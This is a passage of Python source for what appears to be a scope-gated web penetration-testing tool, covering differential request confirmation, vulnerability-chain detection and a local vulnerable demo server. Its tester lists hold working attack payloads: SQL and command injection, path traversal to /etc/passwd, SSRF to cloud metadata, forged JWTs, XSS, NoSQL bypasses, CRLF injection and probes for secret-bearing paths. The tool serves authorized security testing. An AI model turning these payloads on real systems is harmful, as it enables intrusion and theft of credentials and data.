                payload["replay"] = {"ok": False, "error": "replay refused by scope gate"}
                return 1
            else:
                g1 = _http(req["baseline_url"], req.get("method", "GET"),
                           data=None, headers=None)
                g2 = _http(req["attack_url"], req.get("method", "GET"),
                           data=None, headers=None)
                diff, what = _gate_diff(g1, g2)
                payload["replay"] = {"ok": diff, "baseline": _gate_brief(g1),
                                     "attack": _gate_brief(g2), "diff": what}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"═══ 3-GATE REPLAY — {r['id']} {r.get('title', '')[:50]} ═══")
            for i, ev in enumerate(r.get("evidence", []), 1):
                print(f"  evidence {i}: {str(ev.get('proof', ev.get('note', '')))[:160]}"
                      f" ({ev.get('at')})")
            print(f"  status {r.get('status')} · confidence {r.get('confidence')}"
                  f" · cvss {r.get('cvss')}")
            print(f"  integrity: {'✓ signed chain' if not integrity['errors'] else '✗ ' + integrity['errors'][0]}")
            if "replay" in payload:
                rp = payload["replay"]
                if rp.get("ok"):
                    print(f"  replay: ✓ diff reproduced ({'; '.join(rp['diff'])})")
                else:
                    print(f"  replay: ✗ {rp.get('error') or 'responses identical'}")
        return 0
    if not _scope_gate(args.url, quiet=_json_mode(args)):
        return 1
    url_b, url_a = _gate_urls(args)
    if not _scope_gate(url_a, quiet=_json_mode(args)):
        return 1
    method = args.method.upper()
    hb = {}
    for h in args.header or []:
        if ":" in h:
            k, v = h.split(":", 1)
            hb[k.strip()] = v.strip()
    # v5 gate v2 — cookie differentials and JSON-body differentials:
    # --cookie rides both requests; --json-body makes the baseline a JSON POST
    # and --attack-body swaps the attack's body entirely (the classic
    # mass-assignment / role-flip / price-tamper proof shape)
    if getattr(args, "cookie", None):
        hb["Cookie"] = args.cookie
    if getattr(args, "json_body", None):
        method = "POST"
        hb["Content-Type"] = "application/json"
        args.data = args.json_body
        if getattr(args, "attack_body", None) and not getattr(args, "attack_data", None):
            args.attack_data = args.attack_body
    reps = max(1, int(getattr(args, "reps", 1) or 1))
    baselines = []
    for _ in range(reps):
        baselines.append(_http(url_b, method, data=args.data, headers=hb,
                               timeout=getattr(args, "timeout", 8)))
    g1 = baselines[0]
    unstable = any((b["status"], b["sha256"]) != (g1["status"], g1["sha256"])
                   for b in baselines[1:])
    attack_data = _gate_attack_data(args, url_a)
    g2 = _http(url_a, method, data=attack_data, headers=hb,
               timeout=getattr(args, "timeout", 8))
    diff, what = _gate_diff(g1, g2)
    token_hit = None
    if args.confirm:
        token_hit = args.confirm.lower() in g2["body"].lower()
    expect_ok = True
    if getattr(args, "expect_regex", None):
        try:
            expect_ok = re.search(args.expect_regex, g2["body"], re.I | re.M) is not None
        except re.error as e:
            raise UsageError(f"bad --expect-regex: {e}") from e
    if getattr(args, "expect_status", None):
        expect_ok = expect_ok and g2["status"] == args.expect_status
    has_expect = bool(getattr(args, "expect_regex", None)
                      or getattr(args, "expect_status", None) is not None)
    if token_hit is not None:
        decisive = bool(diff and not unstable and token_hit)
    elif has_expect:
        decisive = bool(diff and not unstable and expect_ok)
    else:
        decisive = bool(diff and not unstable and getattr(args, "auto_confirm", False))
    if not _json_mode(args):
        print(f"═══ 3-GATE CONFIRMATION — {method} "
              f"{urllib.parse.urlsplit(args.url).netloc}"
              f"{urllib.parse.urlsplit(args.url).path or '/'} ═══")
        print(f"  ▸ G1 baseline  {url_b[:78]} → {g1['status']} len={len(g1['body'])}"
              f" {g1['elapsed']}s" + (f" ({reps} reps, unstable!)" if unstable else ""))
        print(f"  ▸ G2 attack    {url_a[:78]} → {g2['status']} len={len(g2['body'])}"
              f" {g2['elapsed']}s")
        print(f"  ▸ G3 diff      {'YES' if diff else 'NO'}"
              f" ({'; '.join(what) or 'identical response'})"
              + (f" · confirm-token {'✓' if token_hit else '✗ ABSENT'}"
                 if args.confirm else "")
              + (" · unstable baseline" if unstable else ""))
    title = args.title or f"{args.cls.lower()} differential on {urllib.parse.urlsplit(args.url).path or '/'}"
    proof = (f"baseline: {url_b[:120]} → {g1['status']} len={len(g1['body'])}"
             f" sha={g1['sha256'][:16]}; "
             f"attack: {url_a[:120]} → {g2['status']} len={len(g2['body'])}"
             f" sha={g2['sha256'][:16]}; "
             f"diff: {'; '.join(what) or 'none'}"
             + ("; baseline unstable across repeats" if unstable else "")
             + (f"; confirm token present" if token_hit else ""))
    request_meta = {
        "method": method,
        "baseline_url": url_b,
        "attack_url": url_a,
        "header_names": sorted(hb),
        "data_sha256": _sha(args.data or ""),
        "attack_data_sha256": _sha(attack_data or ""),
    }
    severity = args.severity or _impact_to_severity(title, proof)
    if decisive:
        _cmd_ledger_internal(args.target, title, args.cls, args.url, severity,
                             proof, args.cwe, request_meta=request_meta,
                             quiet=_json_mode(args))
        payload = {"target": args.target, "confirmed": True, "diff": what,
                   "baseline": _gate_brief(g1), "attack": _gate_brief(g2),
                   "token_present": token_hit, "unstable": unstable,
                   "proof": proof}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print("  ✓ CONFIRMED — measurable, reproducible diff; registered in the ledger")
        _event(args.target, "gate.confirmed", title[:100], asset=args.url)
        return 0
    if diff:
        reason = ("baseline unstable across repeats" if unstable else
                  "no decisive token/expectation supplied")
        _cmd_ledger_internal(args.target, title, args.cls, args.url,
                             "info", proof + f"; hypothesis: {reason}", args.cwe,
                             force_hypothesis=True, request_meta=request_meta,
                             quiet=_json_mode(args))
        payload = {"target": args.target, "confirmed": False, "diff": what,
                   "baseline": _gate_brief(g1), "attack": _gate_brief(g2),
                   "token_present": token_hit, "unstable": unstable,
                   "reason": reason, "proof": proof}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"  ⚠ HYPOTHESIS — {reason}; registered at confidence 0.4"
                  " (downgraded, never suppressed)")
        return 0
    payload = {"target": args.target, "confirmed": False, "diff": [],
               "baseline": _gate_brief(g1), "attack": _gate_brief(g2),
               "reason": "responses identical"}
    if _json_mode(args):
        _emit(args, payload)
    else:
        print("  ✗ DISPROVEN — responses identical; nothing registered (no speculation)")
    return 0


def _gate_brief(r: dict) -> dict:
    return {"status": r["status"], "length": len(r["body"]),
            "sha256": r["sha256"], "elapsed": r["elapsed"],
            "truncated": r.get("truncated", False), "error": r.get("error", "")}


# ── 3.4 the chain detection engine (8 patterns) ───────────────────────────────

CHAIN_PATTERNS = [
    {"name": "credential_endpoint",
     "pair": (r"\b(backup|dump|env|git|secret|cred|harvest)\b", r"\b(admin|login|auth|token|session)\b"),
     "impact": "exposed credential/backup material → account takeover on the same estate",
     "plan": "validate the exposed material against the live auth surface (one login attempt, reversed); shukaku crowns the class; kaisha ladders with it",
     "severity": "critical"},
    {"name": "info_disclosure_ssrf",
     "pair": (r"\b(info|debug|stack|error|version|fingerprint)\b", r"\b(ssrf|internal|url fetch|metadata)\b"),
     "impact": "info disclosure names internal hosts → SSRF pivots to them",
     "plan": "point the disclosed-internal host into the SSRF-prone param (GET-only, no-gain); crown the pivot vantage",
     "severity": "high"},
    {"name": "redirect_oauth",
     "pair": (r"\b(redirect|open.?redirect|302)\b", r"\b(oauth|sso|saml|token|callback)\b"),
     "impact": "open redirect on an oauth flow → authorization-code interception",
     "plan": "replay the redirect with an attacker-controlled redirect_uri against a throwaway session (documented-PoC class); kage rule on the callback",
     "severity": "critical"},
    {"name": "idor_data_leak",
     "pair": (r"\b(idor|foreign|scope.?id|org.?id|object.?id)\b", r"\b(data|orders|profile|email|record)\b"),
     "impact": "object-id trust + enumerable data → cross-tenant mass read",
     "plan": "prove read of ONE foreign object id (already-confirmed class, count only); shukaku prices the exposed table",
     "severity": "high"},
    {"name": "xss_csrf",
     "pair": (r"\b(xss|reflected|svg|markup)\b", r"\b(csrf|state change|transfer|payment|invite)\b"),
     "impact": "reflected markup + no CSRF proof → scripted state change on a victim session",
     "plan": "validate the state-changing endpoint accepts a cross-site form POST on a lab account (validation-only)",
     "severity": "high"},
    {"name": "ssti_rce",
     "pair": (r"\b(ssti|template|jinja|twig|velocity)\b", r"\b(rce|code exec|command)\b"),
     "impact": "template injection reaching code evaluation → full server control",
     "plan": "arithmetic-marker probe only ({{7*7}}→49); NEVER a payload chain; undercroft owns the boundary map",
     "severity": "critical"},
    {"name": "race_business",
     "pair": (r"\b(race|replay|idempoten|duplicate|double)\b", r"\b(payment|coupon|balance|withdraw|transfer|credit)\b"),
     "impact": "no idempotency on a money path → double-spend class",
     "plan": "two identical logical requests N=2 (validation-only, zero-balance lab account); kage rule: count_by hash window",
     "severity": "critical"},
    {"name": "cors_credential_read",
     "pair": (r"\b(cors|acao|origin.?reflect|cross.?origin)\b", r"\b(credential|session|token|cookie|auth|profile|account)\b"),
     "impact": "ACAO reflection on an authenticated endpoint → any origin reads the victim's data",
     "plan": "re-request the credential endpoint with a foreign Origin (read-only; the header triggers no fetch); kage rule on the ACAO reflection",
     "severity": "high"},
    {"name": "nosql_authn",
     "pair": (r"\b(nosql|mongo|\\$ne|\\$gt|\\$regex|operator)\b", r"\b(login|auth|session|password|token)\b"),
     "impact": "operator syntax evaluated on an auth path → forged authentication",
     "plan": "one $ne/$gt probe on the login surface (documented-PoC class, one reversible attempt); kage rule on the bypass marker",
     "severity": "critical"},
    {"name": "custom",
     "pair": None, "impact": "operator-defined pairing — registered via ledger classes",
     "plan": "declare the pair with chain plan --pattern custom --requires 'CLS-A+CLS-B'",
     "severity": "medium"},
]


def _chainable_estate(target, asset):
    """Chains describe in-estate kill paths. Third-party assets (github.com/…,
    lookalike repos, other brands) cannot pair into an estate takeover chain.
    Uses the same default-deny + implicit-lab verdict as the live-fire gate."""
    if not asset or asset == "?":
        return True
    if _is_lab(asset):
        return True
    ok, _, _ = sa.check(asset, strict=True, audit=False, allow_lab=False)
    if ok:
        return True
    scope = _load_scope()
    if scope is not None:
        return False  # an authority exists and the asset is outside it
    # no scope authority — fall back to campaign manifest domain
    if asset.lower().startswith(("http://", "https://")):
        from urllib.parse import urlsplit
        host = urlsplit(asset).netloc or asset
    else:
        host = asset.split("/", 1)[0]
    host = host.split(":", 1)[0]
    camp = _camp(target)
    m = _load_json(camp / "manifest.json", {})
    dom = m.get("domain") or m.get("target") or ""
    return bool(dom) and (host == dom or host.endswith("." + dom))


_NEGATIVE_TITLE = re.compile(
    r"\b(no real|no admin|not .*infra|lookalike|spa shell|spa fallback|"
    r"no sensitive surfaces|not .*target|resolve to spa|architecture note)\b",
    re.IGNORECASE)


def _chainable_signal(target, s):
    """A signal may only feed chain detection when its asset is in the estate
    and its own text is not a documented negative (SPA shell, lookalike repo,
    no admin surface). Auto-detected chains get poisoned by exactly those."""
    if _NEGATIVE_TITLE.search(f"{s.get('title','')} {s.get('asset','')}"):
        return False
    return _chainable_estate(target, s.get("asset"))


def _confirmed_signals(target):
    """Every CONFIRMED signal in the campaign, with a stable reference id."""
    camp = _camp(target)
    out = []
    for r in _ledger_load(target):
        if r.get("status") == "CONFIRMED":
            out.append({"id": r.get("id", "?"), "title": r.get("title", ""),
                        "cls": r.get("cls", "GENERAL"), "asset": r.get("asset", "?"),
                        "source": "ledger", "severity": r.get("severity", "medium")})
    for fname, source in (("undercroft-state.json", "undercroft"),
                          ("kenshi-state.json", "undercroft")):
        u = _load_json(camp / fname, {})
        for s in u.get("surface", []) + u.get("logic", []):
            if s.get("status") == "CONFIRMED":
                asset = s.get("endpoint") or s.get("where") or s.get("seam") or "?"
                # stable id: content-derived, not a running counter — a counter
                # renumbers as the ledger grows, orphaning saved chain entries
                h = hashlib.sha1(asset.encode("utf-8", "replace")).hexdigest()[:6]
                title = s.get("seam") or s.get("note") or "undercroft confirmed seam"
                out.append({"id": f"UND-{h}", "title": title,
                            "cls": "UNDERCROFT", "asset": asset, "source": source,
                            "severity": "high"})
    h = _load_json(camp / "harvest-state.json", {})
    for cr in h.get("crown", []):
        out.append({"id": f"HAR-{len(out)+1:03d}",
                    "title": f"{cr.get('class')} harvested",
                    "cls": cr.get("class", "HARVEST"), "asset": cr.get("asset", "?"),
                    "source": "harvest", "severity": "high"})
    return out


def _confirmed_rows(target):
    """Backward-compatible tuple view used by ledger sync."""
    return [(s["title"], s["cls"], s["asset"]) for s in _confirmed_signals(target)]


def _origin(asset):
    from urllib.parse import urlsplit
    if "://" not in (asset or ""):
        return (asset or "?").lower().split("/")[0]
    sp = urlsplit(asset)
    return f"{sp.scheme}://{sp.netloc}".lower()


def _custom_chain(args, camp) -> int:
    requires = [s.strip().upper() for s in (args.requires or "").split("+") if s.strip()]
    if len(requires) < 2:
        raise UsageError("chain plan --pattern custom needs --requires 'CLS-A+CLS-B'")
    st = _load_json(camp / "chain-state.json", {})
    chains = st.get("chains", [])
    n = max([int(m.group(1)) for c in chains
             if (m := re.search(r"(\d+)$", str(c.get("id", ""))))] or [0]) + 1
    cid = f"CH-{n:03d}"
    ch = {"id": cid, "pattern": "custom", "entry_ids": requires,
          "assets": [args.asset or "?"], "impact": "operator-defined chain",
          "plan": args.plan_text or "declare the two classes and validate the first hop",
          "severity": args.severity or "medium",
          "confidence": 0.5, "status": "manual", "manual": True, "at": _now()}
    chains.append(ch)
    st.update({"campaign": args.target, "chains": chains, "at": _now()})
    _atomic_write(camp / "chain-state.json", json.dumps(st, indent=2) + "\n")
    if _json_mode(args):
        _emit(args, {"chain": ch})
    else:
        print(f"▸ {cid} [custom] {' + '.join(requires)} → {ch['severity']}")
    _event(args.target, "chain.manual", f"{cid} {'+'.join(requires)}")
    return 0


def cmd_chain(args):
    camp = _camp(args.target)
    _ensure_campaign(args.target)
    if args.action == "plan" and args.pattern == "custom":
        return _custom_chain(args, camp)
    if args.action == "plan":
        st = _load_json(camp / "chain-state.json", {})
        ch = next((c for c in st.get("chains", []) if c.get("id") == args.chain_id), None)
        if not ch:
            print(f"✗ no chain {args.chain_id}", file=sys.stderr)
            return 2
        if _json_mode(args):
            _emit(args, {"chain": ch})
            return 0
        print(f"═══ CHAIN PLAN — {ch['id']} [{ch['pattern']}] severity {ch['severity']} ═══")
        print(f"  entries:   {', '.join(ch.get('entry_ids', []))}")
        print(f"  assets:    {', '.join(ch.get('assets', []))}")
        print(f"  impact:    {ch['impact']}")
        print(f"  plan:      {ch['plan']}")
        print(f"  confidence {ch['confidence']:.2f} · status {ch['status']}")
        return 0
    if args.action == "list":
        st = _load_json(camp / "chain-state.json", {})
        chains = st.get("chains", [])
        if _json_mode(args):
            _emit(args, {"target": args.target, "chains": chains})
            return 0
        if not chains:
            print("· no chains — chain detect --target <t>")
            return 0
        print(f"═══ CHAINS — {args.target} ({len(chains)}) ═══")
        for c in chains:
            print(f"  {c['id']} [{c['pattern']:22s}] {c['severity']:8s}"
                  f" conf={c['confidence']:.2f} {c['status']:8s} "
                  f"{' + '.join(c.get('entry_ids', []))[:70]}")
        return 0
    signals = [s for s in _confirmed_signals(args.target)
               if _chainable_signal(args.target, s)]
    if getattr(args, "include_hypothesis", False):
        signals += [{"id": r.get("id", "?"), "title": r.get("title", ""),
                     "cls": r.get("cls", "GENERAL"), "asset": r.get("asset", "?"),
                     "source": "ledger-hypothesis", "severity": r.get("severity", "medium")}
                    for r in _ledger_load(args.target)
                    if r.get("status") != "CONFIRMED"]
    if len(signals) < 2:
        if _json_mode(args):
            _emit(args, {"target": args.target, "signals": signals, "chains": [],
                         "reason": "fewer than 2 confirmed signals"})
        else:
            print("· fewer than 2 confirmed signals — chains need findings;"
                  " gate/testers/shiki first")
        return 0
    old = _load_json(camp / "chain-state.json", {})
    manual = [c for c in old.get("chains", []) if c.get("manual")]
    base_n = max([int(m.group(1)) for c in manual
                  if (m := re.search(r"(\d+)$", str(c.get("id", ""))))] or [0])
    chains, n, seen_pairs = [], base_n, set()
    for pat in CHAIN_PATTERNS:
        if pat["pair"] is None:
            continue
        a_re, b_re = pat["pair"]
        hits_a = [s for s in signals if re.search(a_re, f"{s['title']} {s['cls']} {s['asset']}".lower())]
        hits_b = [s for s in signals if re.search(b_re, f"{s['title']} {s['cls']} {s['asset']}".lower())]
        for i, a in enumerate(hits_a):
            for j, b in enumerate(hits_b):
                if a["id"] == b["id"] and a["source"] == b["source"]:
                    continue
                same_asset = _origin(a["asset"]) == _origin(b["asset"]) \
                    or a["asset"] == "?" or b["asset"] == "?"
                if not same_asset:
                    continue
                pkey = (pat["name"], tuple(sorted((a["id"], b["id"]))))
                if pkey in seen_pairs:
                    continue
                seen_pairs.add(pkey)
                n += 1
                conf = 0.55 + 0.1 * min(2, len(hits_a) + len(hits_b) - 2)
                if getattr(args, "include_hypothesis", False) and "hypothesis" in (a["source"] + b["source"]):
                    conf = min(conf, 0.4)
                if conf < (getattr(args, "min_confidence", 0) or 0):
                    continue
                chains.append({"id": f"CH-{n:03d}", "pattern": pat["name"],
                               "entry_ids": [a["id"], b["id"]],
                               "assets": list(dict.fromkeys([a["asset"], b["asset"]])),
                               "impact": pat["impact"], "plan": pat["plan"],
                               "severity": pat["severity"], "confidence": round(conf, 2),
                               "status": "detected", "at": _now()})
    st = {"campaign": args.target, "chains": manual + chains,
          "signals": len(signals), "at": _now()}
    _atomic_write(camp / "chain-state.json", json.dumps(st, indent=2) + "\n")
    if _json_mode(args):
        _emit(args, {"target": args.target, "signals": signals, "chains": chains,
                     "manual": manual, "count": len(chains)})
        return 0
    print(f"═══ CHAIN DETECTION — {args.target} ({len(signals)} confirmed signal(s)) ═══")
    for c in chains:
        print(f"  ▸ {c['id']} [{c['pattern']}] {' + '.join(c['entry_ids'])}"
              f" → {c['severity']} (conf {c['confidence']:.2f})")
    if not chains:
        print("  · no chain patterns matched the confirmed signals")
    print(f"═══ {len(chains)} chain candidate(s) — chain plan --id CH-XXX for the testing plan ═══")
    _event(args.target, "chain.detect", f"{len(chains)} chain(s)")
    return 0


# ── 3.5 the session context (endpoints · roles · credentials · functions) ─────

CONTEXT_KINDS = {"endpoints": "endpoints", "endpoint": "endpoints",
                 "urls": "endpoints", "roles": "roles", "role": "roles",
                 "credentials": "credentials", "credential": "credentials",
                 "creds": "credentials", "functions": "functions",
                 "function": "functions", "source": "source",
                 "source-root": "source", "code": "source"}


def cmd_context(args):
    camp = _camp(args.target)
    _ensure_campaign(args.target)
    st = _load_json(camp / "context.json", {"endpoints": [], "roles": [],
                                            "credentials": [], "functions": []})
    for k in ("endpoints", "roles", "credentials", "functions"):
        st.setdefault(k, [])
    if args.action == "set":
        kind = CONTEXT_KINDS.get((args.kind or "").lower())
        if not kind:
            raise UsageError(f"kind must be one of: {', '.join(CONTEXT_KINDS)}")
        values = args.value if isinstance(args.value, list) else [args.value]
        values = [v for v in values if v]
        if not values:
            raise UsageError("context set needs --value")
        added = []
        for v in values:
            if kind == "endpoints":
                scope = _load_scope()
                if scope is not None and not _is_lab(v) and not _scope_match(scope, v):
                    print(f"✗ CONTEXT REFUSED — {v} is out of the declared estate",
                          file=sys.stderr)
                    return 1
            if v not in st[kind]:
                st[kind].append(v)
                added.append(v)
        if added:
            _atomic_write(camp / "context.json", json.dumps(st, indent=2) + "\n")
            _event(args.target, "context.set", f"{kind}: {', '.join(added)[:160]}")
        payload = {"target": args.target, "kind": kind, "added": added,
                   "context": st}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"▸ context[{kind}] += {len(added)} value(s)"
                  + ("" if added else " (all already present — dedupe)"))
        return 0
    if args.action == "remove":
        kind = CONTEXT_KINDS.get((args.kind or "").lower())
        if not kind:
            raise UsageError(f"kind must be one of: {', '.join(CONTEXT_KINDS)}")
        values = args.value if isinstance(args.value, list) else [args.value]
        before = len(st[kind])
        st[kind] = [x for x in st[kind] if x not in values]
        _atomic_write(camp / "context.json", json.dumps(st, indent=2) + "\n")
        payload = {"target": args.target, "kind": kind, "removed": before - len(st[kind]),
                   "context": st}
        if _json_mode(args):
            _emit(args, payload)
        else:
            print(f"▸ context[{kind}] -= {before - len(st[kind])} value(s)")
        return 0
    if args.action == "clear":
        st = {"endpoints": [], "roles": [], "credentials": [], "functions": []}
        _atomic_write(camp / "context.json", json.dumps(st, indent=2) + "\n")
        _event(args.target, "context.clear", "session context cleared")
        if _json_mode(args):
            _emit(args, {"target": args.target, "context": st})
        else:
            print("▸ session context cleared")
        return 0
    if _json_mode(args):
        _emit(args, {"target": args.target, "context": st,
                     "counts": {k: len(v) for k, v in st.items()}})
        return 0
    print(f"═══ SESSION CONTEXT — {args.target} ═══")
    for k, v in st.items():
        print(f"  {k} ({len(v)}):")
        for x in v[:12]:
            print(f"    · {x[:100]}")
    if not any(st.values()):
        print("  (empty — context set --target T --kind endpoints --value '/api/orders?id=1')")
    return 0


# ── 3.6 the 18 parallel sub-testers ───────────────────────────────────────────

def _t_requests_removed():  # removed — differential requests are built in run_tester
    pass


TESTERS = [
    {"name": "IDOR", "cls": "IDOR",
     "params": ("id", "org_id", "user_id", "account_id", "order_id", "doc_id"),
     "attacks": lambda v: (["foreign", f"{v}+1", "0", "-1", f"{v}-1", "999999"]
                           + ([str(int(v) + 1), str(int(v) - 1)]
                              if v.isdigit() else [])),
     "logic": "object identifier trusted from the request — swap it, diff the body"},
    {"name": "AUTHZ", "cls": "AUTHZ",
     "params": ("role", "admin", "is_admin", "level"),
     "attacks": lambda v: ["admin", "1", "0", "true", "superuser", "root"],
     "logic": "role/level param trusted from input — flip it, diff the body"},
    {"name": "MASSASSIGN", "cls": "MASSASSIGN",
     "params": ("email", "name", "price", "qty", "amount"),
     "attacks": lambda v: [v],
     "extra": "&role=admin&is_admin=1&price=0&balance=999999&admin=true&isAdmin=1&user_type=admin&privilege=9",
     "logic": "unexpected writable fields accepted in the request body (POST only)"},
    {"name": "INJECTION", "cls": "INJECTION",
     "params": ("q", "search", "name", "filter", "sort", "msg", "comment"),
     "attacks": lambda v: ([f"{v}'", f'{v}"', f"{v}' OR '1'='1", "1' AND '1'='2",
                            "`", "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
                            "{{7*'7'}}", f"{v};id", f"{v}$(id)", f"{v}`id`",
                            "*(| (uid=*))"]),
     "signatures": ("sql", "syntax error", "odbc", "mysql", "sqlite", "psql",
                    "ora-", "uid=", "49", "warning:", "unterminated", "pg_"),
     "logic": "input reaches an interpreter — quote/markers reflected or evaluated"},
    {"name": "AUTHN", "cls": "AUTHN",
     "params": ("token", "otp", "code", "password", "nonce"),
     "attacks": lambda v: ["", "null", "0", "000000", "123456", "undefined",
                           "none", "false"],
     "logic": "credential param accepted empty/forged — auth bypass class"},
    {"name": "BIZLOGIC", "cls": "BIZLOGIC",
     "params": ("qty", "amount", "price", "count", "discount", "qty"),
     "attacks": lambda v: ["-1", "0", "99999999", "0.0001", "1e309", "-0.0001"],
     "logic": "quantity/amount accepted out of business range — negative/overflow class"},
    {"name": "SSRF", "cls": "SSRF",
     "params": ("url", "uri", "fetch", "target", "src", "redirect", "next"),
     "attacks": lambda v: (["http://127.0.0.1:9/", "http://localhost:9/",
                            "http://169.254.169.254/latest/meta-data/",
                            "http://[::1]:9/", "http://0x7f000001:9/",
                            "http://2130706433:9/", "http://127.1:9/"]),
     "logic": "user-controlled URL fetched server-side — internal/metadata reach "
              "(loopback · link-local · dword/hex/decimal-host encodings)"},
    {"name": "FILEATTACK", "cls": "TRAVERSAL",
     "params": ("path", "file", "page", "template", "include", "lang",
                "name", "filename", "download", "read", "doc"),
     "attacks": lambda v: (["../../etc/passwd", "....//etc/passwd",
                            "..%2f..%2fetc%2fpasswd", "%2e%2e%2fetc%2fpasswd",
                            "..\\..\\etc\\passwd", "/etc/passwd",
                            "....\\....\\etc\\passwd",
                            "%uff0e%uff0e%uff0fetc%uff0fpasswd"]),
     "signatures": ("root:x:0:0", "root:*:0:0", "daemon:"),
     "logic": "path param never normalized — traversal escapes the web root "
              "(dot-dot · encoded · double-encoded · backslash · absolute · unicode)"},
    {"name": "JWT", "cls": "JWT",
     "params": ("token", "jwt", "auth", "id_token", "access_token"),
     "attacks": lambda v: (["eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
                            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
                            ""]),
     "signatures": ("admin", "true"),
     "logic": "token claims trusted without signature verification — alg=none / "
              "confused-deputy / empty-signature forgery class"},
    {"name": "XSS", "cls": "XSS",
     "params": ("q", "search", "name", "comment", "msg", "term"),
     "attacks": lambda v: (["spy<svg/onload=x>", '"><svg/onload=x>',
                            "<img src=x onerror=spy1>", "'-spy<svg>-'",
                            "<iframe src=spy>"]),
     "signatures": ("<svg", "<img", "<iframe", "onload=", "onerror="),
     "logic": "input reflected without context-encoding — markup reaches the "
              "response body (reflection proof; execution is the browser's call)"},
    {"name": "SESSION", "cls": "SESSION",
     "params": ("sid", "sessionid", "session", "sess", "phpsessid", "jsessionid"),
     "attacks": lambda v: ([f"{v}1", "0", "1", "-1", f"{v}00"]),
     "signatures": ("admin", "role", "true"),
     "logic": "session identifier structure trusted — sequential/weak ids "
              "enumerated (CWE-384 class)"},
    # ── v5.5.0 THE BATTERY EXPANSION — seven new classes ────────────────────
    {"name": "REDIRECT", "cls": "REDIRECT",
     "params": ("next", "redirect", "url", "return", "returnTo", "goto", "dest",
                "continue", "target", "rurl", "forward"),
     "attacks": lambda v: (["//redirect.probe.invalid/x", "/\\redirect.probe.invalid/x",
                            "https://redirect.probe.invalid/x",
                            "https:////redirect.probe.invalid/x",
                            "/%2f%2eredirect.probe.invalid/x"]),
     "logic": "redirect target trusted from input — Location swaps to a foreign "
              "origin (probe uses the .invalid TLD: it never resolves, so no "
              "third party is ever contacted — CWE-601 class)"},
    {"name": "CORS", "cls": "CORS",
     "params": (),
     "attacks": lambda v: ["https://cors.probe.invalid"],
     "logic": "Origin reflected into Access-Control-Allow-Origin with credentials "
              "— any site reads authenticated responses (CWE-942 class; the "
              "Origin header triggers no fetch — read-only)"},
    {"name": "NOSQL", "cls": "NOSQL",
     "params": ("user", "username", "email", "pass", "password", "login", "q"),
     "attacks": lambda v: (['{"$ne":null}', "[$ne]=1", '{"$gt":""}', "$gt",
                            "[$regex]=.*", '{"$regex":".*"}', "true, $where: '1'"]),
     "signatures": ('"authenticated": true', '"role": "admin"', '"bypass": true'),
     "logic": "operator syntax reaches a document interpreter — $ne/$gt/$regex "
              "evaluate server-side (CWE-943 class)"},
    {"name": "CRLF", "cls": "CRLF",
     "params": ("next", "redirect", "page", "lang", "url", "path", "name", "q"),
     "attacks": lambda v: ([f"{v}%0d%0aX-Probe: spy", f"{v}%0d%0aSet-Cookie: spy=1",
                            f"{v}%0a%0dX-Probe: spy", f"{v}\r\nX-Probe: spy"]),
     "logic": "input carried into response headers unnormalized — CRLF splits "
              "the response / injects headers (CWE-113 class; marker header "
              "only, nothing set on any real session)"},
    {"name": "HARVEST", "cls": "HARVEST",
     "params": (),
     "attacks": lambda v: [],
     "paths": (".env", ".git/HEAD", ".svn/entries", ".DS_Store", "backup.zip",
               "backup.sql", "dump.sql", "debug", "phpinfo", "phpinfo.php",
               "actuator/env", "swagger.json", "api-docs", ".well-known/security.txt",
               "server-status"),
     "signatures": ("secret", "api_key", "apikey", "password=", "ref: refs/",
                    "BEGIN PRIVATE KEY", "phpinfo()", "DATABASE_URL",
                    "{\"paths\"", "swagger", "\"openapi\"", "disk_free"),
     "logic": "sensitive material served at predictable paths — config, VCS "
              "metadata, dumps, debug surfaces (GET-only, count-only: NO-GAIN)"},
    {"name": "DIRECTORY", "cls": "DIRECTORY",
     "params": (),
     "attacks": lambda v: [],
     "paths": ("files/", "backup/", "static/", "data/", "uploads/", "images/",
               "assets/", "archive/", "old/", "test/"),
     "signatures": ("index of /", "<title>directory listing", "parent directory"),
     "logic": "autoindex left on at predictable roots — full tree enumeration "
              "(GET-only, read-only: CWE-548 class)"},
    {"name": "REPLAY", "cls": "REPLAY",
     "params": (),
     "attacks": lambda v: [],
     "logic": "state-changing endpoint lacks idempotency — the same logical "
              "request fired twice produces a second effect (N=2, validation-"
              "only, zero-balance lab accounts — CWE-837 class)"},
]


def _demo_replica():
    """A lab-bound vulnerable replica (like dojo's): the 18 testers have something
    REAL to strike with zero setup. 127.0.0.1 only, self-terminating."""
    from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
    state = {"replay_hits": 0}

    def _qs(qs):
        from urllib.parse import unquote_plus
        out = {}
        for x in qs.split("&"):
            if x:
                k, _, v = x.partition("=")
                out[k] = unquote_plus(v)
        return out

    class H(BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _send(self, code, body, ctype="application/json",
                  extra_headers=None, raw_header_value=None):
            b = body.encode()
            self.send_response(code)
            self.send_header("Content-Type", ctype)
            self.send_header("Content-Length", str(len(b)))
            # v5.5.0 — the CRLF flaw: a raw value is carried into the header
            # block unnormalized (a split/injected header is the proof)
            if raw_header_value:
                for part in raw_header_value.replace("\r\n", "\n").split("\n"):
                    if ":" in part:
                        hk, _, hv = part.partition(":")
                        self.send_header(hk.strip(), hv.strip())
            for hk, hv in (extra_headers or {}).items():
                self.send_header(hk, hv)
            self.end_headers()
            self.wfile.write(b)

        def do_GET(self):
            p, _, qs = self.path.partition("?")
            q = _qs(qs)
            if p == "/api/orders":
                org = q.get("org_id", "acme")
                self._send(200, json.dumps({"org": org, "orders": [1, 2, 3]}))
            elif p == "/api/profile":
                uid = q.get("user_id", "1001")
                self._send(200, json.dumps({"user_id": uid, "email": f"user{uid}@lab",
                                            "role": "user"}))
            elif p == "/search":
                self._send(200, f"results for {q.get('q', '')}", "text/html")
            elif p == "/fetch":
                u = q.get("url", "")
                if u.startswith("http://127.0.0.1:9/"):
                    self._send(200, json.dumps({"fetched": "INTERNAL-BANNER-7f3a"}))
                else:
                    self._send(200, json.dumps({"fetched": "denied"}))
